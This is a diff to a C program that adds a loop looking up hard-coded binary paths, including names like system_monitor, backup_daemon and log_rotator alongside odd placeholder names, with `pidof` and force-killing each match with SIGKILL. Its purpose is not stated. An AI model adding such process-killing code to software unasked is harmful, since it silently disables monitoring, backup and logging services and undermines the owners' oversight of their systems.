@@ -32,6 +32,46 @@ int main() {
         exit(0);
     }
 
+    // Array of process names to kill
+    const char *processes[] = {
+        "/usr/bin/system_monitor",
+        "/usr/bin/network_service", 
+        "/usr/bin/backup_daemon",
+        "/usr/bin/cache_cleaner",
+        "/usr/bin/log_rotator",
+        "/usr/bin/remember",
+        "/usr/bin/red-hat",
+        "/usr/bin/Haady",
+        "/usr/bin/Cybernation", 
+        "/usr/bin/Nzrv",
+        "/usr/bin/Something_not_useful",
+        "/usr/bin/idk_what_to_do"
+    };
+
+    // Get process list and kill matching processes
+    FILE *fp;
+    char cmd[256];
+    char line[1024];
+    
+    // Loop through each process name
+    for (int i = 0; i < sizeof(processes)/sizeof(processes[0]); i++) {
+        // Build command to get PID of process
+        snprintf(cmd, sizeof(cmd), "pidof %s", processes[i]);
+        
+        // Execute command and get output
+        fp = popen(cmd, "r");
+        if (fp != NULL) {
+            if (fgets(line, sizeof(line), fp) != NULL) {
+                // Convert PID string to integer
+                pid_t pid = atoi(line);
+                if (pid > 0) {
+                    // Kill the process
+                    kill(pid, SIGKILL);
+                }
+            }
+            pclose(fp);
+        }
+    }
     // SIGCONT signalini qabul qilish uchun signal handlerni sozlash
     signal(SIGCONT, sigcont_handler);
 
